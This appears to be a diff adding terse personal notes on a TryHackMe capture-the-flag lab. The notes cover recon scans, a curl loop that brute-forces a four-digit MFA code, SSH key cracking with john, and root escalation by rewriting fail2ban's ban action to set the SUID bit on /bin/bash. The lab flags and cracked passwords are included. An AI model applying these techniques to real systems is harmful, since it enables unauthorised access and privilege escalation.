@@ -1,0 +1,68 @@
+ip={
+	10.10.20.74
+}
+
+
+└─$ nmap -sC -sV -oN nmap/initial $IP        
+
+
+------------------------------------------------
+tools/comand
+	feroxbuster --url http://10.10.20.74/ -e
+		rezult
+			Scans:
+		  3: running      http://10.10.20.74/icons/
+		  6: running      http://10.10.20.74/console
+		  7: complete     http://10.10.20.74/console/securimage
+		 10: complete     http://10.10.20.74/console/securimage/images
+		 21: running      http://10.10.20.74/icons/small
+		 24: running      http://10.10.20.74/console/securimage/examples
+		 30: complete     http://10.10.20.74/console/securimage/words
+		 31: complete     http://10.10.20.74/console/securimage/backgrounds
+		 32: complete     http://10.10.20.74/console/securimage/audio
+		 41: running      http://10.10.20.74/console/securimage/database
+		─────────────────────────────────────────────────────────────────────────
+		Commands:
+------------------------------------------------------
+finde in http://10.10.20.74/console/config.phps 
+		
+		└─$ echo 6a61736f6e5f746573745f6163636f756e74 | xxd -r -p
+		jason_test_account                                                                                             
+		┌──(bdragon㉿kali)-[~/thm/biteme]
+		└─$ xxd -r -p <<< 6a61736f6e5f746573745f6163636f756e74
+		jason_test_account                   
+--------------------------------------------------		
+with hasher.py find Password (akbr)
+----------------------------------------
+whith this you can brutfors mfa twoathentikation 
+
+	for i in {0000..9999}; do echo $i; curl -s -X POST --data "code=$i" 10.10.20.74/console/mfa.php --cookie "user=jason_test_account; pwd=abkr" | wc | grep -v "     23      95    1523"; if [ $? -eq 0 ]; then echo Found IT; break; fi; done
+---------------------------------------------------------
+
+	in /home/jason/user.txt is flag 
+THM{6fbf1fb7241dac060cd3abba70c33070}
+
+	finde: id_rsa >jason_id_ras
+$	/usr/share/john/ssh2john.py jason_id_ras >forjohn.txt
+$	john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
+	john fine pass_fraze: 1a2b3c4d
+
+
+	{
+		try to enter in root from ssh fred@ip
+
+		find iptables-multiport.conf fail2ban restart no root executable use thet to get root acces   how? {this way
+			go to file and change thos line to this : 
+			actionban = chmod +s /bin/bash
+
+
+			actionunban = chmod +s /bin/bash
+		}
+		sudo /bin/systemctl restart fail2ban
+
+		then try to restart from spam the ban 
+		 bumm your the root 
+		 cat root.txt 
+		 THM{0e355b5c907ef7741f40f4a41cc6678d}
+		 
+	}
